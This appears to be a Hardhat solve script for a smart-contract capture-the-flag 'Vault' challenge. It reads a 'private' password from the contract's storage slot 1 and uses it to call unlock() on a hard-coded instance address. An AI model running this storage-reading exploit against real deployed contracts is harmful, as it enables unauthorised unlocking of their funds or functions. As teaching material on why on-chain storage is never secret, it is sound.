const { ethers } = require("hardhat");
const hre = require("hardhat");


async function solve(instance_address, account) {

    const Vault = await ethers.getContractFactory("Vault");

    let vault = Vault.attach(instance_address);

    let storage1 = await ethers.provider.getStorageAt(instance_address, 1);
    
    console.log(`Vault locked: ${await vault.locked()}`);

    console.log(`The password is ${storage1}`);

    console.log('Unlocking the contract');
    tx = await vault.unlock(storage1);

    console.log('Waiting for 10 confirmations...');
    await tx.wait(10);

    console.log(`Vault locked: ${await vault.locked()}`);

    console.log('Success!');

}


async function main() {

    const [account] = await ethers.getSigners();
    console.log(`Account address: ${account.address}`);
    console.log('');

    instance_address = '0xeB6634dCF0489a39FC76570303cb195D2B748b62';

    await solve(instance_address, account);

}


main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
